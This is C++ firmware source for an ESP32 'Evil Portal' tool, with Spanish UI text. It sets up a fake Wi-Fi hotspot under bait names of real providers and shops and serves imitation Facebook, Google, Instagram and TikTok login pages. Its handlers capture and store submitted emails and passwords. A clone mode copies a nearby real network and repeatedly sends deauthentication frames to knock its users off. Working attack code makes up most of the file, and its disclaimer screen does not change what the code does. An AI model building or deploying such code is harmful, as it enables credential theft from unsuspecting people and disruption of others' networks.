#include "EvilPortal.h"
#include "EvilPortalHTML.h"
#include "EvilPortalLogs.h"
#include "DisplayTFT.h"
#include <WiFi.h>
#include <WebServer.h>
#include <DNSServer.h>
#include "esp_wifi.h"
#include "PepeDraw.h"
#include "Pins.h"
#include "PeripheralTools.h"
#include "SoundUtils.h"

extern DisplayTFT tft;

// ═══════════════════════════════════════════════════════════════════════════
//  CONFIGURACIÓN
// ═══════════════════════════════════════════════════════════════════════════
#define MAX_APS_SCAN    30
#define VISIBLE_ROWS    6
#define DNS_PORT        53
#define HTTP_PORT       80

// ═══════════════════════════════════════════════════════════════════════════
//  SSIDs PREDEFINIDOS
// ═══════════════════════════════════════════════════════════════════════════
static const char* PRESET_SSIDS[] = {
    "INFINITUM_5G_LIBRE",
    "TOTALPLAY_INVITADOS",
    "MEGACABLE_FREE_WIFI",
    "IZZI_HOTSPOT",
    "Starbucks_Clientes",
    "OXXO_WiFi_Gratis",
    "Walmart_Free",
    "MCDONALDS_FREE",
    "Aeropuerto_WiFi",
    "Plaza_WiFi_Gratis"
};
static const int PRESET_COUNT = sizeof(PRESET_SSIDS) / sizeof(char*);

// ═══════════════════════════════════════════════════════════════════════════
//  ESTADO GLOBAL
// ═══════════════════════════════════════════════════════════════════════════
static DNSServer dnsServer;
static WebServer httpServer(HTTP_PORT);

static String       g_currentSSID = "";
static uint8_t      g_cloneBSSID[6] = {0};
static int          g_cloneChannel = 1;
static bool         g_cloneMode = false;
static bool         g_doDeauth = false;

static volatile int g_clientsConnected = 0;
static volatile int g_capturesSession = 0;
static String       g_lastCapturePlatform = "";
static String       g_lastCaptureEmail = "";
static String       g_lastCapturePassword = "";
static unsigned long g_lastCaptureTime = 0;

// Deauth frame (igual al del Deauther)
static uint8_t deauthFrame[26] = {
    0xC0, 0x00, 0x00, 0x00,
    0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00,
    0x07, 0x00
};

// ═══════════════════════════════════════════════════════════════════════════
//  HELPERS
// ═══════════════════════════════════════════════════════════════════════════

static void drawCenteredTitle(const String& s, int y, uint16_t col, int size) {
    int w = getTextWidth(s, size, FONT_BIG);
    drawStringBig((320 - w) / 2, y, s, col, size);
}

static int rssiBars(int rssi) {
    if (rssi >= -55) return 4;
    if (rssi >= -70) return 3;
    if (rssi >= -85) return 2;
    if (rssi >= -95) return 1;
    return 0;
}

static String macToStr(const uint8_t mac[6]) {
    char buf[18];
    snprintf(buf, sizeof(buf), "%02X:%02X:%02X:%02X:%02X:%02X",
             mac[0], mac[1], mac[2], mac[3], mac[4], mac[5]);
    return String(buf);
}

static String replaceAll(const String& haystack,
                         const String& needle,
                         const String& replacement) {
    String out = haystack;
    int idx;
    while ((idx = out.indexOf(needle)) >= 0) {
        out = out.substring(0, idx) + replacement +
              out.substring(idx + needle.length());
    }
    return out;
}

// ═══════════════════════════════════════════════════════════════════════════
//  HANDLERS HTTP
// ═══════════════════════════════════════════════════════════════════════════

static void handleRoot() {
    g_clientsConnected++;
    String page = FPSTR(html_selector);
    page = replaceAll(page, "__SSID__", g_currentSSID);
    httpServer.send(200, "text/html", page);
}

static void handleFB() {
    httpServer.send_P(200, "text/html", html_facebook);
}

static void handleGG() {
    httpServer.send_P(200, "text/html", html_google);
}

static void handleIG() {
    httpServer.send_P(200, "text/html", html_instagram);
}

static void handleTT() {
    httpServer.send_P(200, "text/html", html_tiktok);
}

static void handleLogin() {
    String platform = httpServer.arg("platform");
    String email    = httpServer.arg("email");
    String password = httpServer.arg("password");

    if (platform.length() == 0) platform = "Unknown";

    portalLogAdd(platform, email, password, g_currentSSID);
    g_capturesSession++;
    g_lastCapturePlatform = platform;
    g_lastCaptureEmail = email;
    g_lastCapturePassword = password;
    g_lastCaptureTime = millis();

    beep(3200, 50);

    httpServer.send_P(200, "text/html", html_success);
}

static void handleCaptive() {
    String page = FPSTR(html_selector);
    page = replaceAll(page, "__SSID__", g_currentSSID);
    httpServer.send(200, "text/html", page);
}

static void handleNotFound() {
    httpServer.sendHeader("Location", "/", true);
    httpServer.send(302, "text/plain", "");
}

// ═══════════════════════════════════════════════════════════════════════════
//  INICIAR AP + DNS + HTTP
// ═══════════════════════════════════════════════════════════════════════════

static bool startPortal(const String& ssid, int channel = 6) {
    g_currentSSID = ssid;
    g_clientsConnected = 0;
    g_capturesSession = 0;
    g_lastCapturePlatform = "";
    g_lastCaptureEmail = "";
    g_lastCapturePassword = "";

    WiFi.mode(WIFI_AP);
    delay(100);

    IPAddress apIP(192, 168, 4, 1);
    IPAddress apNet(255, 255, 255, 0);
    WiFi.softAPConfig(apIP, apIP, apNet);

    bool apOk = WiFi.softAP(ssid.c_str(), nullptr, channel, 0, 8);
    if (!apOk) return false;

    delay(200);

    if (g_cloneMode && g_doDeauth) {
        esp_wifi_set_promiscuous(true);
    }

    dnsServer.start(DNS_PORT, "*", apIP);

    httpServer.on("/",  handleRoot);
    httpServer.on("/fb", handleFB);
    httpServer.on("/gg", handleGG);
    httpServer.on("/ig", handleIG);
    httpServer.on("/tt", handleTT);
    httpServer.on("/login", HTTP_POST, handleLogin);

    httpServer.on("/generate_204",       handleCaptive);
    httpServer.on("/gen_204",            handleCaptive);
    httpServer.on("/hotspot-detect.html", handleCaptive);
    httpServer.on("/library/test/success.html", handleCaptive);
    httpServer.on("/success.txt",        handleCaptive);
    httpServer.on("/ncsi.txt",           handleCaptive);
    httpServer.on("/connecttest.txt",    handleCaptive);
    httpServer.onNotFound(handleNotFound);

    httpServer.begin();
    return true;
}

static void stopPortal() {
    httpServer.stop();
    dnsServer.stop();
    if (g_cloneMode && g_doDeauth) {
        esp_wifi_set_promiscuous(false);
    }
    WiFi.softAPdisconnect(true);
    WiFi.mode(WIFI_OFF);
    delay(100);
}

// ═══════════════════════════════════════════════════════════════════════════
//  DEAUTH EN PARALELO (solo en clone mode)
// ═══════════════════════════════════════════════════════════════════════════

static void sendDeauthToVictimNetwork() {
    const uint8_t broadcast[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
    memcpy(&deauthFrame[4],  broadcast,    6);
    memcpy(&deauthFrame[10], g_cloneBSSID, 6);
    memcpy(&deauthFrame[16], g_cloneBSSID, 6);
    esp_wifi_80211_tx(WIFI_IF_AP, deauthFrame, sizeof(deauthFrame), false);
}

// ═══════════════════════════════════════════════════════════════════════════
//  DISCLAIMER
// ═══════════════════════════════════════════════════════════════════════════

static bool showDisclaimer() {
    tft.fillScreen(TFT_BLACK);
    tft.drawRect(0, 0, 320, 240, TFT_RED);
    tft.drawRect(1, 1, 318, 238, TFT_RED);

    drawCenteredTitle("EVIL PORTAL", 12, TFT_RED, 2);
    tft.drawFastHLine(0, 50, 320, TFT_RED);

    int y = 60;
    drawStringCustom(10, y, "Crea un AP falso para capturar",     UI_MAIN, 1); y += 12;
    drawStringCustom(10, y, "credenciales via portal cautivo.",   UI_MAIN, 1); y += 20;

    drawStringCustom(10, y, "Uso LEGAL:",                          TFT_GREEN, 1); y += 12;
    drawStringCustom(20, y, "- Tu red / tus dispositivos",         UI_ACCENT, 1); y += 12;
    drawStringCustom(20, y, "- Red con permiso del dueno",         UI_ACCENT, 1); y += 18;

    drawStringCustom(10, y, "Uso ILEGAL:",                         TFT_RED, 1); y += 12;
    drawStringCustom(20, y, "- Enganar a terceros",                UI_ACCENT, 1); y += 12;
    drawStringCustom(20, y, "- Capturar info sin consentim.",      UI_ACCENT, 1); y += 18;

    drawStringCustom(10, y, "Phishing es delito grave.",           TFT_RED, 1); y += 12;
    drawStringCustom(10, y, "100% responsabilidad tuya.",          UI_MAIN, 1);

    tft.drawFastHLine(0, 212, 320, TFT_RED);
    drawStringCustom(10, 220, "OK: ACEPTAR   UP/DN: CANCELAR", UI_ACCENT, 1);

    while (true) {
        if (navEnterPressed()) {
            beep(2200, 60);
            while (navEnterPressed()) delay(5);
            delay(100);
            return true;
        }
        if (navUpPressed() || navDownPressed()) {
            beep(1000, 80);
            while (navUpPressed() || navDownPressed()) delay(5);
            delay(100);
            return false;
        }
        delay(20);
    }
}

// ═══════════════════════════════════════════════════════════════════════════
//  MENÚ PRINCIPAL
// ═══════════════════════════════════════════════════════════════════════════

static void drawMainMenu(int cursor) {
    tft.fillScreen(TFT_BLACK);
    tft.drawRect(0, 0, 320, 240, UI_MAIN);
    drawStringBig(10, 8, "EVIL PORTAL", UI_MAIN, 1);
    tft.drawFastHLine(0, 30, 320, UI_ACCENT);

    const char* items[] = {
        "Iniciar Ataque",
        "Ver Logs Capturados",
        "Borrar Todos los Logs"
    };

    for (int i = 0; i < 3; i++) {
        int y = 50 + i * 35;
        bool sel = (i == cursor);
        if (sel) tft.fillRect(5, y - 4, 310, 28, UI_SELECT);
        uint16_t col = sel ? UI_BG : UI_MAIN;
        drawStringCustom(15, y, items[i], col, 2);
    }

    int logCount = portalLogCount();
    tft.drawFastHLine(0, 215, 320, UI_ACCENT);
    drawStringCustom(10, 222,
        "Logs:" + String(logCount) + "/" + String(MAX_LOGS) + "  OK(HOLD):BACK",
        UI_ACCENT, 1);
}

static int selectMainMenu() {
    int cursor = 0;
    drawMainMenu(cursor);
    while (true) {
        if (navUpPressed()) {
            cursor = (cursor + 2) % 3;
            beep(2100, 20);
            drawMainMenu(cursor);
            delay(180);
        }
        if (navDownPressed()) {
            cursor = (cursor + 1) % 3;
            beep(2100, 20);
            drawMainMenu(cursor);
            delay(180);
        }
        if (navEnterPressed()) {
            bool held = waitOkReleaseWasLong();
            beep(held ? 1000 : 1800, 40);
            delay(100);
            if (held) return -1;
            return cursor;
        }
        delay(20);
    }
}

// ═══════════════════════════════════════════════════════════════════════════
//  MODO: SIMPLE vs CLONE
// ═══════════════════════════════════════════════════════════════════════════

static int selectMode() {
    const char* items[] = {
        "Modo SIMPLE",
        "Modo CLONE + Deauth"
    };
    const char* descs[] = {
        "SSID predefinido",
        "Clona red real + ataque",
        ""
    };

    int cursor = 0;
    auto draw = [&]() {
        tft.fillScreen(TFT_BLACK);
        tft.drawRect(0, 0, 320, 240, UI_MAIN);
        drawStringBig(10, 8, "SELECT MODE", UI_MAIN, 1);
        tft.drawFastHLine(0, 30, 320, UI_ACCENT);

    for (int i = 0; i < 2; i++) {
            int y = 50 + i * 40;
            bool sel = (i == cursor);
            if (sel) tft.fillRect(5, y - 4, 310, 34, UI_SELECT);
            uint16_t colMain = sel ? UI_BG : UI_MAIN;
            uint16_t colSub  = sel ? UI_BG : UI_ACCENT;
            drawStringCustom(15, y, items[i], colMain, 2);
            if (strlen(descs[i]) > 0) {
                drawStringCustom(15, y + 16, descs[i], colSub, 1);
            }
        }

        tft.drawFastHLine(0, 215, 320, UI_ACCENT);
        drawStringCustom(10, 222, "OK:SELECT  OK(HOLD):BACK", UI_ACCENT, 1);
    };
    draw();

    while (true) {
        if (navUpPressed()) {
            cursor = (cursor + 1) % 2;
            beep(2100, 20); draw(); delay(180);
        }
        if (navDownPressed()) {
            cursor = (cursor + 1) % 2;
            beep(2100, 20); draw(); delay(180);
        }
        if (navEnterPressed()) {
            bool held = waitOkReleaseWasLong();
            beep(held ? 1000 : 1800, 40);
            delay(100);
            return held ? -1 : cursor;
        }
        delay(20);
    }
}

// ═══════════════════════════════════════════════════════════════════════════
//  SELECTOR DE SSID PREDEFINIDO
// ═══════════════════════════════════════════════════════════════════════════

static int selectPresetSSID() {
    int cursor = 0;
    int scrollOffset = 0;
    int total = PRESET_COUNT;

    auto draw = [&]() {
        tft.fillScreen(TFT_BLACK);
        tft.drawRect(0, 0, 320, 240, UI_MAIN);
        drawStringBig(10, 8, "SELECT SSID", UI_MAIN, 1);
        drawStringCustom(230, 12, "[" + String(PRESET_COUNT) + " opts]",
                         UI_ACCENT, 1);
        tft.drawFastHLine(0, 30, 320, UI_ACCENT);

        const int rowH = 28;
        const int listY = 38;
        for (int i = 0; i < VISIBLE_ROWS; i++) {
            int idx = i + scrollOffset;
            if (idx >= total) break;
            int y = listY + i * rowH;
            bool sel = (idx == cursor);
            if (sel) tft.fillRect(5, y, 310, rowH - 2, UI_SELECT);
            uint16_t col = sel ? UI_BG : UI_MAIN;
            String ssid = String(PRESET_SSIDS[idx]);
            if (getTextWidth(ssid, 2) <= 290) {
                drawStringCustom(15, y + 7, ssid, col, 2);
            } else {
                drawStringFit(15, y + 12, ssid, col, 290, 1);
            }
        }

        if (total > VISIBLE_ROWS) {
            int barH = (VISIBLE_ROWS * 176) / total;
            int barY = 38 + (scrollOffset * (176 - barH)) / (total - VISIBLE_ROWS);
            tft.fillRect(314, barY, 4, barH, UI_ACCENT);
        }

        tft.drawFastHLine(0, 215, 320, UI_ACCENT);
        drawStringCustom(10, 222, "OK:START  OK(HOLD):BACK", UI_ACCENT, 1);
    };
    draw();

    while (true) {
        if (navUpPressed()) {
            cursor = (cursor + total - 1) % total;
            if (cursor < scrollOffset) scrollOffset = cursor;
            if (cursor >= scrollOffset + VISIBLE_ROWS)
                scrollOffset = cursor - VISIBLE_ROWS + 1;
            beep(2100, 20); draw(); delay(180);
        }
        if (navDownPressed()) {
            cursor = (cursor + 1) % total;
            if (cursor < scrollOffset) scrollOffset = cursor;
            if (cursor >= scrollOffset + VISIBLE_ROWS)
                scrollOffset = cursor - VISIBLE_ROWS + 1;
            beep(2100, 20); draw(); delay(180);
        }
        if (navEnterPressed()) {
            bool held = waitOkReleaseWasLong();
            beep(held ? 1000 : 1800, 40);
            delay(100);
            if (held) return -1;
            return cursor;
        }
        delay(20);
    }
}

// ═══════════════════════════════════════════════════════════════════════════
//  CLONE MODE: SCAN + SELECT
// ═══════════════════════════════════════════════════════════════════════════

struct ScanAP {
    String  ssid;
    uint8_t bssid[6];
    int     rssi;
    int     channel;
};

static ScanAP scanAPs[MAX_APS_SCAN];
static int    scanAPCount = 0;

static void scanForClone() {
    scanAPCount = 0;

    tft.fillScreen(TFT_BLACK);
    tft.drawRect(0, 0, 320, 240, UI_MAIN);
    drawStringBig(10, 8, "CLONE MODE", UI_MAIN, 1);
    tft.drawFastHLine(0, 30, 320, UI_ACCENT);
    drawStringCustom(10, 50, "Scanning networks 8s...", UI_MAIN, 1);

    int barX = 10, barY = 90, barW = 300, barH = 14;
    tft.drawRect(barX, barY, barW, barH, UI_ACCENT);

    WiFi.mode(WIFI_STA);
    WiFi.disconnect();
    delay(100);
    WiFi.scanNetworks(true, true);

    unsigned long start = millis();
    while (millis() - start < 8000) {
        float p = (float)(millis() - start) / 8000.0f;
        int fw = (int)((barW - 2) * p);
        tft.fillRect(barX + 1, barY + 1, fw, barH - 2, UI_SELECT);
        delay(150);
    }

    int n = WiFi.scanComplete();
    while (n == WIFI_SCAN_RUNNING) { delay(100); n = WiFi.scanComplete(); }
    if (n < 0) n = 0;
    if (n > MAX_APS_SCAN) n = MAX_APS_SCAN;

    for (int i = 0; i < n; i++) {
        scanAPs[i].ssid = WiFi.SSID(i);
        if (scanAPs[i].ssid.length() == 0) scanAPs[i].ssid = "<hidden>";
        scanAPs[i].rssi = WiFi.RSSI(i);
        scanAPs[i].channel = WiFi.channel(i);
        uint8_t* b = WiFi.BSSID(i);
        if (b) memcpy(scanAPs[i].bssid, b, 6);
    }
    scanAPCount = n;
    WiFi.scanDelete();

    for (int i = 0; i < scanAPCount - 1; i++) {
        for (int j = 0; j < scanAPCount - 1 - i; j++) {
            if (scanAPs[j].rssi < scanAPs[j + 1].rssi) {
                ScanAP t = scanAPs[j];
                scanAPs[j] = scanAPs[j + 1];
                scanAPs[j + 1] = t;
            }
        }
    }

    beep(2400, 50);
}

static int selectCloneTarget() {
    if (scanAPCount == 0) return -1;

    int cursor = 0;
    int scrollOffset = 0;
    int total = scanAPCount;

    auto draw = [&]() {
        tft.fillScreen(TFT_BLACK);
        tft.drawRect(0, 0, 320, 240, UI_MAIN);
        drawStringBig(10, 8, "CLONE TARGET", UI_MAIN, 1);
        drawStringCustom(240, 12, "[" + String(scanAPCount) + "]", UI_ACCENT, 1);
        tft.drawFastHLine(0, 30, 320, UI_ACCENT);

        const int rowH = 28;
        const int listY = 36;
        for (int i = 0; i < VISIBLE_ROWS; i++) {
            int idx = i + scrollOffset;
            if (idx >= total) break;
            int y = listY + i * rowH;
            bool sel = (idx == cursor);
            if (sel) tft.fillRect(5, y, 310, rowH - 2, UI_SELECT);
            uint16_t col1 = sel ? UI_BG : UI_MAIN;
            uint16_t col2 = sel ? UI_BG : UI_ACCENT;

            String s = scanAPs[idx].ssid;
            drawStringFit(10, y + 4, s, col1, 255, 1);
            String meta = "CH" + String(scanAPs[idx].channel) + " " +
                          String(scanAPs[idx].rssi) + "dBm";
            drawStringCustom(10, y + 15, meta, col2, 1);
            int bars = rssiBars(scanAPs[idx].rssi);
            int bx = 280, by = 22;
            for (int b = 0; b < 4; b++) {
                int bh = 3 + b * 2;
                uint16_t c = (b < bars)
                    ? (sel ? UI_BG : (bars >= 3 ? TFT_GREEN :
                                      bars >= 2 ? TFT_YELLOW : TFT_ORANGE))
                    : (sel ? UI_BG : UI_ACCENT);
                if (b < bars) tft.fillRect(bx + b*5, by - bh, 3, bh, c);
                else          tft.drawRect(bx + b*5, by - bh, 3, bh, c);
            }
        }

        if (total > VISIBLE_ROWS) {
            int barH = (VISIBLE_ROWS * 176) / total;
            int barY = 36 + (scrollOffset * (176 - barH)) / (total - VISIBLE_ROWS);
            tft.fillRect(314, barY, 4, barH, UI_ACCENT);
        }

        tft.drawFastHLine(0, 215, 320, UI_ACCENT);
        drawStringCustom(10, 222, "OK:CLONE  OK(HOLD):BACK", UI_ACCENT, 1);
    };
    draw();

    while (true) {
        if (navUpPressed()) {
            cursor = (cursor + total - 1) % total;
            if (cursor < scrollOffset) scrollOffset = cursor;
            if (cursor >= scrollOffset + VISIBLE_ROWS)
                scrollOffset = cursor - VISIBLE_ROWS + 1;
            beep(2100, 20); draw(); delay(180);
        }
        if (navDownPressed()) {
            cursor = (cursor + 1) % total;
            if (cursor < scrollOffset) scrollOffset = cursor;
            if (cursor >= scrollOffset + VISIBLE_ROWS)
                scrollOffset = cursor - VISIBLE_ROWS + 1;
            beep(2100, 20); draw(); delay(180);
        }
        if (navEnterPressed()) {
            bool held = waitOkReleaseWasLong();
            beep(held ? 1000 : 1800, 40);
            delay(100);
            if (held) return -1;
            return cursor;
        }
        delay(20);
    }
}

// ═══════════════════════════════════════════════════════════════════════════
//  DASHBOARD DE ATAQUE ACTIVO
// ═══════════════════════════════════════════════════════════════════════════

static void drawDashboardFrame() {
    tft.fillScreen(TFT_BLACK);
    tft.drawRect(0, 0, 320, 240, UI_SELECT);
    tft.drawRect(1, 1, 318, 238, UI_SELECT);

    drawStringBig(10, 8, "PORTAL ACTIVE", UI_SELECT, 1);

    drawStringFit(10, 30, "SSID: " + g_currentSSID, UI_MAIN, 300, 1);
    if (g_cloneMode) {
        drawStringCustom(10, 42, "[CLONE+DEAUTH]", TFT_RED, 1);
        drawStringCustom(120, 42, "CH:" + String(g_cloneChannel), UI_ACCENT, 1);
    } else {
        drawStringCustom(10, 42, "[SIMPLE]", TFT_GREEN, 1);
    }

    tft.drawFastHLine(0, 58, 320, UI_SELECT);

    drawStringCustom(15, 70, "Conectados:", UI_ACCENT, 1);
    drawStringCustom(170, 70, "Capturas:",  UI_ACCENT, 1);

    tft.drawFastHLine(0, 110, 320, UI_ACCENT);
    drawStringCustom(15, 116, "ULTIMA CAPTURA:", UI_SELECT, 1);

    tft.drawFastHLine(0, 210, 320, UI_SELECT);
    drawStringCustom(10, 218, "OK(HOLD):STOP  DOWN:LOGS", TFT_RED, 1);
}

static void drawDashboardStats() {
    tft.fillRect(15, 80, 140, 24, TFT_BLACK);
    drawStringCustom(15, 82, String((int)g_clientsConnected), TFT_YELLOW, 3);

    tft.fillRect(170, 80, 140, 24, TFT_BLACK);
    drawStringCustom(170, 82, String((int)g_capturesSession), TFT_GREEN, 3);

    tft.fillRect(10, 130, 300, 70, TFT_BLACK);
    if (g_lastCapturePlatform.length() > 0) {
        drawStringCustom(15, 132, "Plataforma: " + g_lastCapturePlatform,
                         TFT_CYAN, 1);
        String em = g_lastCaptureEmail;
        drawStringFit(15, 148, "User: " + em, UI_MAIN, 290, 1);

        String pw = g_lastCapturePassword;
        drawStringFit(15, 164, "Pass: " + pw, UI_MAIN, 290, 1);

        unsigned long ago = (millis() - g_lastCaptureTime) / 1000;
        String agoStr = ago < 60 ? String(ago) + "s ago" :
                        ago < 3600 ? String(ago / 60) + "m ago" :
                                     String(ago / 3600) + "h ago";
        drawStringCustom(15, 180, "Hace " + agoStr, UI_ACCENT, 1);
    } else {
        drawStringCustom(15, 155, "(esperando primera captura...)",
                         UI_ACCENT, 1);
    }
}

// ═══════════════════════════════════════════════════════════════════════════
//  LOOP PRINCIPAL DEL PORTAL
// ═══════════════════════════════════════════════════════════════════════════

static void runPortalLoop() {
    drawDashboardFrame();
    drawDashboardStats();
    beep(2400, 40); delay(20);
    beep(3000, 60);

    unsigned long lastRedraw = millis();
    unsigned long lastDeauth = millis();
    int lastConn = 0;
    int lastCap = 0;

    bool stopAttack = false;
    unsigned long okPressStart = 0;
    bool okHeld = false;

    while (!stopAttack) {
        dnsServer.processNextRequest();
        httpServer.handleClient();

        if (g_cloneMode && g_doDeauth &&
            millis() - lastDeauth > 30) {
            sendDeauthToVictimNetwork();
            lastDeauth = millis();
        }

        bool needRedraw = false;
        if (g_clientsConnected != lastConn) {
            lastConn = g_clientsConnected;
            needRedraw = true;
        }
        if (g_capturesSession != lastCap) {
            lastCap = g_capturesSession;
            needRedraw = true;
            beep(3600, 60); delay(30); beep(4200, 100);
        }
        if (millis() - lastRedraw > 1000) {
            needRedraw = true;
        }
        if (needRedraw) {
            drawDashboardStats();
            lastRedraw = millis();
        }

        if (navEnterPressed()) {
            if (!okHeld) {
                okPressStart = millis();
                okHeld = true;
            } else if (millis() - okPressStart > 500) {
                stopAttack = true;
            }
        } else {
            okHeld = false;
        }

        yield();
        delay(2);
    }

    stopPortal();

    beep(1800, 40); delay(20);
    beep(1200, 60);

    while (navEnterPressed()) delay(5);
    delay(150);
}

// ═══════════════════════════════════════════════════════════════════════════
//  VISOR DE LOGS · letras grandes (size 2)
// ═══════════════════════════════════════════════════════════════════════════

static String truncateNativeToWidth(const String& txt, int maxWidth,
                                    uint8_t font, uint8_t size) {
    if (maxWidth <= 0) return "";
    if (tft.nativeTextWidth(txt, font, size) <= maxWidth) return txt;

    const String ellipsis = "..";
    if (tft.nativeTextWidth(ellipsis, font, size) >= maxWidth) return "";

    int lastGood = 0;
    for (int i = 1; i <= (int)txt.length(); i++) {
        String candidate = txt.substring(0, i) + ellipsis;
        if (tft.nativeTextWidth(candidate, font, size) > maxWidth) break;
        lastGood = i;
    }
    return (lastGood > 0) ? txt.substring(0, lastGood) + ellipsis : ellipsis;
}

static void drawNativeFit(int x, int y, const String& txt, uint16_t color,
                          int maxWidth, uint8_t font = 2, uint8_t size = 1) {
    tft.drawNativeStringTransparent(x, y,
                                    truncateNativeToWidth(txt, maxWidth, font, size),
                                    color, font, size);
}

static int drawLogDetailField(int y, const String& label, const String& value,
                              uint16_t valueColor) {
    drawStringCustom(12, y, label, UI_ACCENT, 1);
    y += 11;

    tft.drawRect(10, y - 2, 300, 25, UI_ACCENT);
    tft.fillRect(11, y - 1, 298, 23, TFT_BLACK);
    drawStringFit(15, y + 4, value, valueColor, 290, 1, FONT_BIG);
    return y + 31;
}

static String cleanExportField(const char* value) {
    String out = String(value);
    out.replace("\r", " ");
    out.replace("\n", " ");
    out.replace("\t", " ");
    return out;
}

static String redactedPassword(const char* value) {
    int len = strlen(value);
    if (len <= 0) return "[EMPTY]";
    return "[REDACTED len:" + String(len) + "]";
}

static bool exportLogsToSd(int& exportedCount) {
    exportedCount = 0;
    int count = portalLogCount();
    if (count <= 0) return false;

    String out;
    out.reserve(128 + count * 180);
    out += "LOGS EXPORTADOS: " + String(count) + "\r\n";
    out += "PASSWORD: REDACTADA EN SD\r\n";
    out += "\r\n";

    for (int i = 0; i < count; i++) {
        PortalLog log;
        if (!portalLogGet(i, log)) continue;

        out += "#" + String(i + 1) + "\r\n";
        out += "PLATFORM: " + cleanExportField(log.platform) + "\r\n";
        out += "USER: " + cleanExportField(log.email) + "\r\n";
        out += "PASS: " + redactedPassword(log.password) + "\r\n";
        out += "SSID: " + cleanExportField(log.ssid) + "\r\n";
        out += "BOOT: " + String(log.bootNum) + "\r\n";
        out += "UPTIME: " + String(log.timestampSec) + "s\r\n";
        out += "\r\n";
        exportedCount++;
    }

    return exportedCount > 0 && sdWriteTextFile("/CREDENCIALES.txt", out);
}

static void showLogExportResult(bool ok, int exportedCount) {
    tft.fillScreen(TFT_BLACK);
    tft.drawRect(0, 0, 320, 240, ok ? TFT_GREEN : TFT_RED);
    drawStringBig(10, 8, ok ? "EXPORT OK" : "EXPORT ERROR", ok ? TFT_GREEN : TFT_RED, 1);
    tft.drawFastHLine(0, 34, 320, ok ? TFT_GREEN : TFT_RED);

    if (ok) {
        drawStringCustom(18, 76, "Guardado en microSD:", TFT_WHITE, 1);
        drawStringCustom(18, 98, "/CREDENCIALES.txt", TFT_CYAN, 2);
        drawStringCustom(18, 134, "Logs exportados: " + String(exportedCount), TFT_WHITE, 1);
        drawStringCustom(18, 154, "Passwords redactadas.", TFT_YELLOW, 1);
    } else {
        drawStringCustom(18, 88, "No se pudo escribir en la SD.", TFT_WHITE, 1);
        drawStringCustom(18, 112, "Revisa montaje/espacio/tarjeta.", TFT_YELLOW, 1);
    }

    tft.drawFastHLine(0, 215, 320, UI_ACCENT);
    drawStringCustom(10, 222, "OK: Back", UI_ACCENT, 1);
    while (!navEnterPressed()) delay(20);
    while (navEnterPressed()) delay(5);
    delay(80);
}

static void showLogDetail(const PortalLog& log) {
    tft.fillScreen(TFT_BLACK);
    tft.drawRect(0, 0, 320, 240, UI_MAIN);
    drawStringBig(10, 8, "LOG DETAIL", UI_MAIN, 1);
    tft.drawFastHLine(0, 30, 320, UI_ACCENT);

    int y = 40;

    y = drawLogDetailField(y, "Platform", String(log.platform), UI_SELECT);
    y = drawLogDetailField(y, "Email / User", String(log.email), UI_MAIN);
    y = drawLogDetailField(y, "Password", String(log.password), TFT_RED);

    drawStringFit(12, y, "SSID: " + String(log.ssid), UI_ACCENT, 296, 1);
    y += 18;
    drawStringFit(12, y, "Boot #" + String(log.bootNum) +
                  " @ " + String(log.timestampSec) + "s",
                  UI_ACCENT, 296, 1);

    tft.drawFastHLine(0, 215, 320, UI_ACCENT);
    drawStringCustom(10, 222, "OK: Back", UI_ACCENT, 1);

    while (!navEnterPressed()) delay(20);
    beep(1800, 40);
    while (navEnterPressed()) delay(5);
    delay(100);
}

static void viewLogs() {
    int count = portalLogCount();
    if (count == 0) {
        tft.fillScreen(TFT_BLACK);
        tft.drawRect(0, 0, 320, 240, UI_MAIN);
        drawStringBig(10, 8, "LOGS", UI_MAIN, 1);
        tft.drawFastHLine(0, 30, 320, UI_ACCENT);
        drawStringCustom(50, 110, "No hay capturas guardadas.", UI_ACCENT, 1);
        drawStringCustom(50, 125, "Intenta un ataque primero.", UI_ACCENT, 1);
        drawStringCustom(10, 222, "OK: Back", UI_ACCENT, 1);
        while (!navEnterPressed()) delay(20);
        beep(1800, 40);
        while (navEnterPressed()) delay(5);
        return;
    }

    int cursor = 0;
    int scrollOffset = 0;
    int total = count;

    auto draw = [&]() {
        tft.fillScreen(TFT_BLACK);
        tft.drawRect(0, 0, 320, 240, UI_MAIN);
        drawStringBig(10, 8, "LOGS", UI_MAIN, 1);
        drawStringCustom(240, 12, "[" + String(count) + "]", UI_ACCENT, 1);
        tft.drawFastHLine(0, 30, 320, UI_ACCENT);

        const int rowH = 42;
        const int listY = 36;
        int visibleRows = 4;

        for (int i = 0; i < visibleRows; i++) {
            int idx = i + scrollOffset;
            if (idx >= total) break;
            int y = listY + i * rowH;
            bool sel = (idx == cursor);
            if (sel) tft.fillRect(5, y, 310, rowH - 2, UI_SELECT);
            uint16_t col1 = sel ? UI_BG : UI_MAIN;
            uint16_t col2 = sel ? UI_BG : UI_ACCENT;

            PortalLog log;
            if (portalLogGet(idx, log)) {
                String line1 = "[#" + String(idx + 1) + "] " +
                               String(log.platform);
                drawStringFit(10, y + 4, line1, col1, 300, 1, FONT_BIG);
                String em = String(log.email);
                drawStringFit(10, y + 24, em, col2, 300, 1);
            }
        }

        if (total > visibleRows) {
            int barH = (visibleRows * 176) / total;
            int barY = 36 + (scrollOffset * (176 - barH)) / (total - visibleRows);
            tft.fillRect(314, barY, 4, barH, UI_ACCENT);
        }

        tft.drawFastHLine(0, 215, 320, UI_ACCENT);
        drawStringCustom(10, 222, "OK:VER  BACK:SAVE SD  OK(H):BACK", UI_ACCENT, 1);
    };
    draw();

    while (true) {
        if (navUpPressed()) {
            cursor = (cursor + total - 1) % total;
            if (cursor < scrollOffset) scrollOffset = cursor;
            if (cursor >= scrollOffset + 4) scrollOffset = cursor - 3;
            beep(2100, 20); draw(); delay(180);
        }
        if (navDownPressed()) {
            cursor = (cursor + 1) % total;
            if (cursor < scrollOffset) scrollOffset = cursor;
            if (cursor >= scrollOffset + 4) scrollOffset = cursor - 3;
            beep(2100, 20); draw(); delay(180);
        }
        if (navBackPressed()) {
            while (navBackPressed()) delay(5);
            int exported = 0;
            bool ok = exportLogsToSd(exported);
            beep(ok ? 2400 : 900, 60);
            showLogExportResult(ok, exported);
            draw();
            delay(120);
        }
        if (navEnterPressed()) {
            bool held = waitOkReleaseWasLong();
            beep(held ? 1000 : 1800, 40);
            delay(100);
            if (held) break;
            PortalLog log;
            if (portalLogGet(cursor, log)) {
